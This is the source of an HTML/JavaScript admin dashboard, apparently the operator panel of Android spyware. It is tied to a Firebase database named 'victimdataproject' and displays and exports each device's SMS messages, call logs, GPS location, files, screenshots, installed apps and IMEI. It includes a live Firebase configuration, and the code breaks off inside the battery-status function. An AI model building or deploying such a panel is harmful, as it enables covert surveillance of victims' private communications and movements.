<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" integrity="sha256-kLaT2GOSpHechhsozzB+flnD+zUyjE2LlfWPgU04xyI=" crossorigin=""/>
    <style>
        body {
            display: flex;
            min-height: 100vh;
            flex-direction: column;
            background-color: var(--bs-dark-bg-subtle, #212529); /* Ensure body bg matches theme */
        }
        .sidebar {
            width: 280px;
            min-height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            bottom: 0;
            z-index: 100; /* Sidebar above main content, but below topbar if it overlaps for toggler */
            padding-top: 56px; /* Height of topbar */
            box-shadow: inset -1px 0 0 rgba(0, 0, 0, .1);
            background-color: var(--bs-dark, #212529) !important; /* Ensure sidebar bg */
        }
        .main-content {
            padding: 20px;
            padding-top: 76px; /* Height of topbar + some padding */
            width: 100%; 
            margin-left: 0; /* Default for mobile */
        }
        .topbar {
            height: 56px;
            position: fixed;
            top: 0;
            right: 0;
            left: 0; /* Default for mobile */
            z-index: 1030; /* Higher than sidebar, Bootstrap's standard for fixed navbars */
            background-color: var(--bs-dark, #212529) !important; /* Ensure topbar bg */
        }
        .sidebar .nav-link {
            font-weight: 500;
            color: var(--bs-light);
        }
        .sidebar .nav-link .fa-fw {
            width: 1.25em;
        }
        .sidebar .nav-link:hover, .sidebar .nav-link.active {
            color: var(--bs-primary);
            background-color: rgba(var(--bs-primary-rgb), 0.1);
        }
        .sidebar-sticky {
            position: relative;
            top: 0;
            height: calc(100vh - 56px); /* Adjusted for padding-top of sidebar */
            padding-top: .5rem;
            overflow-x: hidden;
            overflow-y: auto;
        }
        .card-body-scrollable {
            max-height: 400px;
            overflow-y: auto;
        }
        .status-badge { font-size: 0.8em; }
        .status-online { background-color: #28a745; }
        .status-offline { background-color: #dc3545; }
        .status-unknown { background-color: #6c757d; }

        #map { height: 450px; width: 100%; border-radius: 0.375rem; }

        /* Mobile adjustments */
        @media (max-width: 767.98px) { /* sm and down */
            .sidebar {
                transform: translateX(-100%);
                transition: transform 0.3s ease-in-out;
                 /* Ensure display is correct for transform to work */
                display: block; 
            }
            .sidebar.open {
                transform: translateX(0);
            }
            .sidebar-toggler { /* This class is on the button */
                display: block !important; 
            }
        }
        
        @media (min-width: 768px) { /* md and up */
            .sidebar {
                transform: translateX(0); /* Always visible */
                /* d-md-block from bootstrap handles display: block !important */
            }
            .topbar {
                left: 280px; 
            }
            .main-content {
                margin-left: 280px;
            }
            .sidebar-toggler { /* Hide toggler on desktop */
                display: none !important; 
            }
        }


        /* Login page styling */
        #login-page {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            /* background-color: #212529; /* Taken care of by body bg */
        }
        #login-form-container {
            width: 100%;
            max-width: 400px;
            padding: 2rem;
            background-color: var(--bs-body-bg, #343a40); 
            border-radius: 0.5rem;
            box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.15);
        }
        .screenshot-img {
            max-width: 150px;
            max-height: 150px;
            object-fit: cover;
            border-radius: 0.25rem;
            margin: 5px;
            cursor: pointer;
        }
        .file-icon {
            font-size: 2rem;
            margin-right: 10px;
        }

        /* Adjust brand text size for very small screens if needed */
        .navbar-brand.fs-6 {
            font-size: 1rem !important; /* Default fs-6 */
        }
        @media (max-width: 380px) {
            .navbar-brand.fs-6 {
                font-size: 0.85rem !important; /* Smaller on very narrow screens */
            }
            #logout-button span { /* Hide text "Logout" on very small screens */
                display: none;
            }
        }

    </style>
</head>
<body>

    <!-- Login Page -->
    <div id="login-page">
        <div id="login-form-container">
            <h2 class="text-center text-light mb-4">Admin Login</h2>
            <form id="login-form">
                <div class="mb-3">
                    <label for="email" class="form-label text-light">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label text-light">Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div id="login-error" class="text-danger mt-3 text-center"></div>
            </form>
        </div>
    </div>

    <!-- Dashboard -->
    <div id="dashboard-page" class="d-none">
        <!-- Topbar -->
        <header class="navbar navbar-dark sticky-top p-0 shadow topbar">
            <div class="d-flex align-items-center w-100 px-2 px-md-3">
                <!-- Sidebar Toggler (Mobile) -->
                <button class="navbar-toggler collapsed border-0 sidebar-toggler me-2" type="button" aria-controls="sidebarMenu" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                
                <!-- Brand -->
                <a class="navbar-brand me-auto me-md-0 text-truncate fs-6" href="#" style="max-width: 150px;">Admin Panel</a>

                <!-- Welcome/Device Info - Centered and Responsive -->
                <div class="flex-grow-1 text-center text-light d-none d-sm-block px-2">
                    <small>
                        <span id="welcome-message">Welcome, User</span>
                        <span class="d-none d-md-inline"> | </span>
                        <span class="d-block d-md-inline fw-bold" id="selected-device-name">No Device Selected</span>
                    </small>
                </div>

                <!-- Logout Button -->
                <div class="navbar-nav ms-auto">
                    <div class="nav-item text-nowrap">
                        <button id="logout-button" class="nav-link btn btn-link px-3 text-light">
                            <span>Logout </span><i class="fas fa-sign-out-alt"></i>
                        </button>
                    </div>
                </div>
            </div>
        </header>

        <div class="container-fluid">
            <div class="row">
                <!-- Sidebar -->
                <!-- Removed 'collapse' class. 'd-md-block' from Bootstrap handles desktop visibility -->
                <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block sidebar">
                    <div class="position-sticky pt-3 sidebar-sticky">
                        <ul class="nav flex-column">
                            <li class="nav-item">
                                <a class="nav-link active" data-target="device-list-content" href="#">
                                    <i class="fas fa-fw fa-list"></i> Device List
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="sms-logs-content" href="#">
                                    <i class="fas fa-fw fa-comments"></i> SMS Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="call-logs-content" href="#">
                                    <i class="fas fa-fw fa-phone-alt"></i> Call Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="installed-apps-content" href="#">
                                    <i class="fab fa-fw fa-android"></i> Installed Apps
                                </a>
                            </li>
                             <li class="nav-item">
                                <a class="nav-link" data-target="battery-content" href="#">
                                    <i class="fas fa-fw fa-battery-full"></i> Battery
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="location-content" href="#">
                                    <i class="fas fa-fw fa-map-marker-alt"></i> Location
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="files-content" href="#">
                                    <i class="fas fa-fw fa-folder-open"></i> Files
                                </a>
                            </li>
                             <li class="nav-item">
                                <a class="nav-link" data-target="screenshots-content" href="#">
                                    <i class="fas fa-fw fa-camera"></i> Screenshots
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="device-info-content" href="#">
                                    <i class="fas fa-fw fa-info-circle"></i> Device Info
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="export-data-content" href="#">
                                    <i class="fas fa-fw fa-file-export"></i> Export Data
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>

                <!-- Main content -->
                <main class="main-content">
                    <div class="content-section" id="device-list-content">
                        <h2><i class="fas fa-list"></i> Device List</h2>
                        <div class="mb-3">
                            <input type="text" id="device-search" class="form-control" placeholder="Search devices by alias...">
                        </div>
                        <div class="table-responsive">
                            <table class="table table-striped table-hover">
                                <thead>
                                    <tr>
                                        <th>Alias</th>
                                        <th>Status</th>
                                        <th>Last Seen</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="device-list-table-body">
                                    <!-- Device rows will be injected here -->
                                </tbody>
                            </table>
                        </div>
                        <div id="no-devices-message" class="alert alert-info d-none">No devices found.</div>
                    </div>

                    <div class="content-section d-none" id="sms-logs-content">
                        <h2><i class="fas fa-comments"></i> SMS Logs <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="sms">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>Timestamp</th><th>Type</th><th>Sender/Recipient</th><th>Body</th></tr></thead>
                                <tbody id="sms-logs-table-body"></tbody>
                            </table>
                        </div>
                        <div id="no-sms-message" class="alert alert-info mt-3">Select a device to view SMS logs or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="call-logs-content">
                        <h2><i class="fas fa-phone-alt"></i> Call Logs <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="calls">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>Timestamp</th><th>Type</th><th>Number</th><th>Duration</th></tr></thead>
                                <tbody id="call-logs-table-body"></tbody>
                            </table>
                        </div>
                         <div id="no-calls-message" class="alert alert-info mt-3">Select a device to view Call logs or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="installed-apps-content">
                        <h2><i class="fab fa-android"></i> Installed Apps <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="apps">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>App Name</th><th>Package Name</th><th>Version</th></tr></thead>
                                <tbody id="installed-apps-table-body"></tbody>
                            </table>
                        </div>
                        <div id="no-apps-message" class="alert alert-info mt-3">Select a device to view Installed Apps or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="battery-content">
                        <h2><i class="fas fa-battery-full"></i> Battery Status</h2>
                        <div id="battery-info-card" class="card d-none">
                            <div class="card-body">
                                <h5 class="card-title">Battery Details</h5>
                                <p id="battery-level">Level: N/A</p>
                                <p id="battery-charging">Charging: N/A</p>
                                <p id="battery-health">Health: N/A</p>
                                <p id="battery-temperature">Temperature: N/A</p>
                            </div>
                        </div>
                        <div id="no-battery-message" class="alert alert-info mt-3">Select a device to view Battery status or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="location-content">
                        <h2><i class="fas fa-map-marker-alt"></i> Location</h2>
                        <div id="map"></div>
                        <div id="location-details" class="mt-2 d-none">
                            <p>Latitude: <span id="loc-lat">N/A</span></p>
                            <p>Longitude: <span id="loc-lon">N/A</span></p>
                            <p>Accuracy: <span id="loc-acc">N/A</span></p>
                            <p>Last Update: <span id="loc-time">N/A</span></p>
                        </div>
                        <div id="no-location-message" class="alert alert-info mt-3">Select a device to view Location or no GPS data available.</div>
                    </div>

                    <div class="content-section d-none" id="files-content">
                        <h2><i class="fas fa-folder-open"></i> Files <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="files">Export CSV (List)</button></h2>
                        <div id="files-list" class="list-group card-body-scrollable">
                            <!-- File items will be injected here -->
                        </div>
                        <div id="no-files-message" class="alert alert-info mt-3">Select a device to view Files or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="screenshots-content">
                        <h2><i class="fas fa-camera"></i> Screenshots</h2>
                        <div id="screenshots-gallery" class="d-flex flex-wrap">
                            <!-- Screenshot images will be injected here -->
                        </div>
                         <div id="no-screenshots-message" class="alert alert-info mt-3">Select a device to view Screenshots or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="device-info-content">
                        <h2><i class="fas fa-info-circle"></i> Device Info</h2>
                         <div id="device-info-card" class="card d-none">
                            <div class="card-body">
                                <h5 class="card-title">Device Specifications</h5>
                                <p id="info-model">Model: N/A</p>
                                <p id="info-manufacturer">Manufacturer: N/A</p>
                                <p id="info-android-version">Android Version: N/A</p>
                                <p id="info-imei">IMEI: N/A</p>
                                <!-- Add more as needed -->
                            </div>
                        </div>
                        <div id="no-deviceinfo-message" class="alert alert-info mt-3">Select a device to view Device Info or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="export-data-content">
                        <h2><i class="fas fa-file-export"></i> Export Data</h2>
                        <p>Select a device and then use the "Export CSV" buttons available in each section (SMS, Calls, Apps, Files List) to download data.</p>
                        <p>For a full device data export, this feature would typically involve server-side processing or more complex client-side aggregation.</p>
                        <button id="export-all-for-device-btn" class="btn btn-primary" disabled>Export All Data for Selected Device (Not Implemented)</button>
                         <div id="no-export-message" class="alert alert-info mt-3">Select a device to enable export options.</div>
                    </div>
                </main>
            </div>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js" integrity="sha256-WBkoXOwTeyKclOHuWtc+i2uENFpDZ9YPdf5Hf+D7ewM=" crossorigin=""></script>
    <!-- Firebase SDK -->
    <script type="module">
        // Firebase v9 Modular SDK
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // Global state
        let currentDeviceUID = null;
        let currentDeviceAlias = null;
        let activeDataListenerUnsubscribe = null;
        let activeSectionId = 'device-list-content'; 
        let devicesDataCache = {}; 
        let map; 
        let marker; 

        // DOM Elements
        const loginPage = document.getElementById('login-page');
        const dashboardPage = document.getElementById('dashboard-page');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const logoutButton = document.getElementById('logout-button');
        const welcomeMessage = document.getElementById('welcome-message');
        const selectedDeviceNameDisplay = document.getElementById('selected-device-name');
        const sidebarLinks = document.querySelectorAll('#sidebarMenu .nav-link');
        const contentSections = document.querySelectorAll('.main-content .content-section');
        const deviceSearchInput = document.getElementById('device-search');
        const sidebarToggler = document.querySelector('.sidebar-toggler'); 
        const sidebarMenu = document.getElementById('sidebarMenu');

        // --- AUTHENTICATION ---
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loginPage.classList.add('d-none');
                dashboardPage.classList.remove('d-none');
                welcomeMessage.textContent = `Welcome, ${user.email.split('@')[0]}`; // Shorten email
                initDashboard();
            } else {
                loginPage.classList.remove('d-none');
                dashboardPage.classList.add('d-none');
                if (activeDataListenerUnsubscribe) activeDataListenerUnsubscribe();
                currentDeviceUID = null;
                currentDeviceAlias = null;
                selectedDeviceNameDisplay.textContent = 'No Device Selected';
                welcomeMessage.textContent = 'Welcome, User'; // Reset welcome message
                if(map) {
                    map.remove(); 
                    map = null;
                    marker = null;
                }
                 if (sidebarMenu.classList.contains('open')) { // Close sidebar if open on logout
                    sidebarMenu.classList.remove('open');
                }
            }
        });

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            loginError.textContent = '';
            signInWithEmailAndPassword(auth, email, password)
                .catch((error) => { loginError.textContent = error.message; });
        });

        logoutButton.addEventListener('click', () => {
            firebaseSignOut(auth).catch(error => console.error("Logout error:", error));
        });

        // --- DASHBOARD INITIALIZATION & NAVIGATION ---
        function initDashboard() {
            loadDeviceList();
            navigateToSection(activeSectionId); 
            if (currentDeviceUID && currentDeviceAlias) {
                 selectedDeviceNameDisplay.textContent = currentDeviceAlias;
            } else {
                selectedDeviceNameDisplay.textContent = 'No Device Selected';
            }
        }
        
        if (sidebarToggler) { 
            sidebarToggler.addEventListener('click', () => {
                sidebarMenu.classList.toggle('open');
            });
        }

        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = link.getAttribute('data-target');
                navigateToSection(targetId);

                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                
                if (window.innerWidth < 768 && sidebarMenu.classList.contains('open')) {
                    sidebarMenu.classList.remove('open');
                }
            });
        });
        
        function navigateToSection(sectionId) {
            activeSectionId = sectionId;
            contentSections.forEach(section => {
                section.classList.add('d-none');
            });
            const targetSection = document.getElementById(sectionId);
            if (targetSection) {
                 targetSection.classList.remove('d-none');
            }

            if (activeDataListenerUnsubscribe) {
                activeDataListenerUnsubscribe();
                activeDataListenerUnsubscribe = null;
            }
            
            if (sectionId !== 'device-list-content') {
                 clearDeviceSpecificSections(); 
            }

            const commonNoDataMessage = (elementId, messageKey) => {
                const el = document.getElementById(elementId);
                if(el) {
                    if (currentDeviceUID) {
                        el.classList.add('d-none'); 
                    } else {
                        el.textContent = `Please select a device from the Device List to view ${messageKey}.`;
                        el.classList.remove('d-none');
                    }
                }
            };
            
            const cardBasedNoDataMessage = (cardId, noDataMsgId, messageKey) => {
                const card = document.getElementById(cardId);
                const noDataEl = document.getElementById(noDataMsgId);
                if (card && noDataEl) {
                    if (currentDeviceUID) {
                        noDataEl.classList.add('d-none'); 
                    } else {
                        card.classList.add('d-none');
                        noDataEl.textContent = `Please select a device to view ${messageKey}.`;
                        noDataEl.classList.remove('d-none');
                    }
                }
            };

            if (sectionId === 'device-list-content') {
                // loadDeviceList handles its own "no devices" message
            } else if (currentDeviceUID) {
                document.querySelectorAll('.alert.alert-info[id^="no-"]').forEach(el => {
                    if(el.id !== 'no-devices-message') el.classList.add('d-none');
                });

                switch (sectionId) {
                    case 'sms-logs-content': loadSmsLogs(currentDeviceUID); break;
                    case 'call-logs-content': loadCallLogs(currentDeviceUID); break;
                    case 'installed-apps-content': loadInstalledApps(currentDeviceUID); break;
                    case 'battery-content': loadBatteryInfo(currentDeviceUID); break;
                    case 'location-content': loadLocationData(currentDeviceUID); break;
                    case 'files-content': loadFiles(currentDeviceUID); break;
                    case 'screenshots-content': loadScreenshots(currentDeviceUID); break;
                    case 'device-info-content': loadDeviceInfo(currentDeviceUID); break;
                    case 'export-data-content': 
                        document.getElementById('no-export-message').classList.add('d-none');
                        document.getElementById('export-all-for-device-btn').disabled = false;
                        break;
                }
            } else { 
                 if (sectionId === 'sms-logs-content') commonNoDataMessage('no-sms-message', 'SMS logs');
                 else if (sectionId === 'call-logs-content') commonNoDataMessage('no-calls-message', 'Call logs');
                 else if (sectionId === 'installed-apps-content') commonNoDataMessage('no-apps-message', 'Installed Apps');
                 else if (sectionId === 'battery-content') cardBasedNoDataMessage('battery-info-card', 'no-battery-message', 'Battery status');
                 else if (sectionId === 'location-content') {
                    cardBasedNoDataMessage('location-details', 'no-location-message', 'Location'); 
                    document.getElementById('location-details').classList.add('d-none'); // Also hide loc details div
                    if (map) { map.setView([0,0], 2); if(marker) marker.remove(); marker = null; }
                 }
                 else if (sectionId === 'files-content') commonNoDataMessage('no-files-message', 'Files');
                 else if (sectionId === 'screenshots-content') commonNoDataMessage('no-screenshots-message', 'Screenshots');
                 else if (sectionId === 'device-info-content') cardBasedNoDataMessage('device-info-card', 'no-deviceinfo-message', 'Device Info');
                 else if (sectionId === 'export-data-content') {
                     document.getElementById('no-export-message').classList.remove('d-none');
                     document.getElementById('export-all-for-device-btn').disabled = true;
                 }
            }
        }
        
        function clearDeviceSpecificSections() {
            ['sms-logs-table-body', 'call-logs-table-body', 'installed-apps-table-body'].forEach(id => document.getElementById(id).innerHTML = '');
            ['no-sms-message', 'no-calls-message', 'no-apps-message'].forEach(id => {
                const el = document.getElementById(id);
                if(el) {
                    el.classList.remove('d-none');
                    el.textContent = 'Select a device or no data available.';
                }
            });

            document.getElementById('battery-info-card').classList.add('d-none');
            document.getElementById('no-battery-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            ['battery-level', 'battery-charging', 'battery-health', 'battery-temperature'].forEach(id => {
                 const el = document.getElementById(id);
                 if (el) el.textContent = el.textContent.split(':')[0] + ': N/A';
            });
            
            document.getElementById('location-details').classList.add('d-none');
            document.getElementById('no-location-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            ['loc-lat', 'loc-lon', 'loc-acc', 'loc-time'].forEach(id => document.getElementById(id).textContent = 'N/A');
            if (map && marker) { marker.remove(); marker = null; }
            if (map) map.setView([20,0],2);

            document.getElementById('files-list').innerHTML = '';
            document.getElementById('no-files-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            
            document.getElementById('screenshots-gallery').innerHTML = '';
            document.getElementById('no-screenshots-message').classList.remove('d-none').textContent = 'Select a device or no data available.';

            document.getElementById('device-info-card').classList.add('d-none');
            document.getElementById('no-deviceinfo-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            ['info-model', 'info-manufacturer', 'info-android-version', 'info-imei'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.textContent = el.textContent.split(':')[0] + ': N/A';
            });
        }

        // --- DATA LOADING FUNCTIONS ---
        function loadDeviceList() {
            const devicesRef = ref(db, 'devices/');
            const noDevMsg = document.getElementById('no-devices-message');
            
            onValue(devicesRef, (snapshot) => {
                const devices = snapshot.val();
                devicesDataCache = devices || {}; 

                if (devices && Object.keys(devices).length > 0) {
                    noDevMsg.classList.add('d-none');
                    renderDeviceList(devicesDataCache); 
                } else {
                    document.getElementById('device-list-table-body').innerHTML = ''; 
                    noDevMsg.classList.remove('d-none');
                    noDevMsg.textContent = 'No devices found in the database.';
                }
            }, (error) => {
                console.error("Error loading device list:", error);
                document.getElementById('device-list-table-body').innerHTML = '';
                noDevMsg.classList.remove('d-none').textContent = 'Error loading devices.';
            });
        }

        function renderDeviceList(devicesToRender) {
            const tbody = document.getElementById('device-list-table-body');
            tbody.innerHTML = '';
            const searchTerm = deviceSearchInput.value.toLowerCase();
            let matchFound = false;

            Object.keys(devicesToRender).forEach(uid => {
                const device = devicesToRender[uid];
                if (device.alias && device.alias.toLowerCase().includes(searchTerm)) {
                    matchFound = true;
                    const row = tbody.insertRow();
                    row.insertCell().textContent = device.alias || 'N/A';
                    
                    const statusCell = row.insertCell();
                    const statusBadge = document.createElement('span');
                    statusBadge.classList.add('badge', 'status-badge');
                    statusBadge.textContent = device.status || 'unknown';
                    if (device.status === 'online') statusBadge.classList.add('status-online');
                    else if (device.status === 'offline') statusBadge.classList.add('status-offline');
                    else statusBadge.classList.add('status-unknown');
                    statusCell.appendChild(statusBadge);

                    row.insertCell().textContent = formatTimeAgo(device.last_seen);
                    
                    const actionsCell = row.insertCell();
                    const selectButton = document.createElement('button');
                    selectButton.classList.add('btn', 'btn-sm', 'btn-primary');
                    selectButton.innerHTML = '<i class="fas fa-eye"></i> View';
                    selectButton.onclick = () => {
                        currentDeviceUID = uid;
                        currentDeviceAlias = device.alias;
                        selectedDeviceNameDisplay.textContent = device.alias || 'No Device Selected';
                        
                        const currentActiveSidebarLink = document.querySelector('#sidebarMenu .nav-link.active');
                        let targetSectionAfterSelect = 'sms-logs-content'; 
                        if (currentActiveSidebarLink && currentActiveSidebarLink.dataset.target !== 'device-list-content') {
                            targetSectionAfterSelect = currentActiveSidebarLink.dataset.target;
                        } else { 
                             sidebarLinks.forEach(l => l.classList.remove('active'));
                             const smsLink = document.querySelector(`#sidebarMenu .nav-link[data-target="sms-logs-content"]`);
                             if(smsLink) smsLink.classList.add('active');
                        }
                        navigateToSection(targetSectionAfterSelect);
                         // Close sidebar on mobile after device selection
                        if (window.innerWidth < 768 && sidebarMenu.classList.contains('open')) {
                            sidebarMenu.classList.remove('open');
                        }
                    };
                    actionsCell.appendChild(selectButton);
                }
            });
            
            const noDevMsg = document.getElementById('no-devices-message');
            if (!matchFound && Object.keys(devicesToRender).length > 0 && searchTerm) {
                 tbody.innerHTML = '<tr><td colspan="4" class="text-center">No devices match your search.</td></tr>';
                 noDevMsg.classList.add('d-none');
            } else if (!matchFound && Object.keys(devicesToRender).length === 0 && !searchTerm) { 
                 noDevMsg.classList.remove('d-none');
                 noDevMsg.textContent = 'No devices found in the database.';
            } else if (matchFound) {
                 noDevMsg.classList.add('d-none');
            }
        }
        
        deviceSearchInput.addEventListener('keyup', () => {
            renderDeviceList(devicesDataCache); 
        });

        function loadGenericTableData(deviceId, dataPath, tableBodyId, noDataMessageId, rowRenderer, exportDataStore = null) {
            const dataRef = ref(db, `devices/${deviceId}/${dataPath}`);
            const tableBody = document.getElementById(tableBodyId);
            const noDataMsgEl = document.getElementById(noDataMessageId);
            
            tableBody.innerHTML = ''; 
            if (exportDataStore) exportDataStore.length = 0; 
            noDataMsgEl.classList.add('d-none'); 

            activeDataListenerUnsubscribe = onValue(dataRef, (snapshot) => {
                const data = snapshot.val();
                tableBody.innerHTML = ''; 
                if (exportDataStore) exportDataStore.length = 0;

                if (data && Object.keys(data).length > 0) {
                    noDataMsgEl.classList.add('d-none');
                    const sortedKeys = Object.keys(data).sort((a,b) => (data[b].timestamp || 0) - (data[a].timestamp || 0));

                    sortedKeys.forEach(key => {
                        const item = data[key];
                        const row = rowRenderer(item, key);
                        if (row) tableBody.appendChild(row);
                        if (exportDataStore) { 
                            const exportItem = {};
                            if (item.timestamp) exportItem.Timestamp = new Date(item.timestamp).toLocaleString();
                            else if(item.date) exportItem.Timestamp = new Date(item.date).toLocaleString(); 

                            if (dataPath === 'messages') {
                                exportItem.Type = item.type;
                                exportItem.Contact = item.sender === 'self' ? 'Me' : (item.address || item.sender || 'N/A');
                                exportItem.Body = item.body;
                            } else if (dataPath === 'calls') {
                                exportItem.Type = item.type;
                                exportItem.Number = item.number;
                                exportItem.Duration = item.duration ? `${item.duration}s` : 'N/A';
                                if (item.name) exportItem.ContactName = item.name;
                            } else if (dataPath === 'apps') {
                                exportItem.AppName = item.name;
                                exportItem.PackageName = item.packageName;
                                exportItem.Version = item.version;
                            }
                            if(Object.keys(exportItem).length > 1) exportDataStore.push(exportItem); 
                            else if (Object.keys(exportItem).length === 0 && Object.keys(item).length > 0) exportDataStore.push(item);
                        }
                    });
                } else {
                    noDataMsgEl.textContent = 'No data available for this section on the selected device.';
                    noDataMsgEl.classList.remove('d-none');
                }
            }, (error) => {
                console.error(`Error loading ${dataPath}:`, error);
                noDataMsgEl.textContent = `Error loading data: ${error.message}`;
                noDataMsgEl.classList.remove('d-none');
            });
        }
        
        let smsExportData = [];
        function loadSmsLogs(deviceId) {
            loadGenericTableData(deviceId, 'messages', 'sms-logs-table-body', 'no-sms-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
                row.insertCell().textContent = item.type || 'N/A'; 
                row.insertCell().textContent = item.sender === 'self' ? 'Me' : (item.sender || item.address || 'N/A'); // `address` is common for SMS
                row.insertCell().textContent = item.body || 'N/A';
                if(item.is_new || item.read === 0 || item.read === "0") row.classList.add('table-info', 'fw-bold'); // Highlight unread/new
                return row;
            }, smsExportData);
        }

        let callsExportData = [];
        function loadCallLogs(deviceId) {
            loadGenericTableData(deviceId, 'calls', 'call-logs-table-body', 'no-calls-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.timestamp ? new Date(item.timestamp).toLocaleString() : (item.date ? new Date(item.date).toLocaleString() : 'N/A');
                row.insertCell().textContent = item.type || 'N/A';
                row.insertCell().textContent = item.number || 'N/A';
                row.insertCell().textContent = item.duration ? `${item.duration}s` : 'N/A';
                return row;
            }, callsExportData);
        }

        let appsExportData = [];
        function loadInstalledApps(deviceId) {
            loadGenericTableData(deviceId, 'apps', 'installed-apps-table-body', 'no-apps-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.name || 'N/A';
                row.insertCell().textContent = item.packageName || 'N/A';
                row.insertCell().textContent = item.version || 'N/A';
                return row;
            }, appsExportData);
        }
       
        function loadBatteryInfo(deviceId) {
            const batteryRef = ref(db, `devices/${deviceId}/battery`);
            const noDataMsg = document.getElementById('no-battery-message');
            const cardEl = document.getElementById('battery-info-card');
            
            cardEl.classList.add('d-none');
            noDataMsg.classList.add('d-none');

            activeDataListenerUnsubscribe = onValue(batteryRef, (snapshot) => {
                const data = snapshot.val();
                if (data && Object.keys(data).length > 0) { 
                    noDataMsg.classList.add('d-none');
                    cardEl.classList.remove('d-none');
                    document.getElementById('battery-level').textContent = `Level: ${data.level !== undefined ? data.level + '%' : 'N/A'}`;
                    document.getElementById('battery-charging').textContent = `Charging: ${data.is_charging !== undefined ? (data.is_charging ? 'Yes' : 'No') : 'N/A'}`;
                    document.getElementById('battery-health').textContent = `Health: ${data.health || 'N/A'}`;
                    document.getElementById('battery-temperature').textContent = `Temperature: ${data.temperature !== undefined ? data.temperature + '°C' : 'N/A'}`;
                } else {
